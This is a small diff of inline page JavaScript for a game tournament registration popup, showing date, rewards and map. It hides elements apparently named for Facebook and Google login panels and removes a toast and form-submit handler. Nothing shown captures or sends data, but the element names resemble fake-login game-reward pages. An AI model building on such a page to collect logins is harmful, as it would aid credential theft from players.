 function sendTur(e){
 	document.getElementsByClassName("pop")[0].style.display = "block";
 	document.getElementById("regi").innerText = e;
 	showBlur(true);
+	fbLogs.style.display = "none";
+	gLogs.style.display = "none";
 	document.getElementById("fb").style.display = "none";
 	document.getElementById("dat").innerText = "Game Date: "+dat;
 	document.getElementById("rwd").innerText = "Rewards: "+rwd;
    document.getElementById("smp").innerText = "Selected Map: "+smp;
 }
-function launch_toast() {
-    var x = document.getElementById("toast")
-    x.className = "show";
-    setTimeout(function(){ x.className = x.className.replace("show", ""); }, 5000);
-}	
-document.getElementById("fFarm").addEventListener('submit', subFarm);
   </script>
 </body>
   </html>
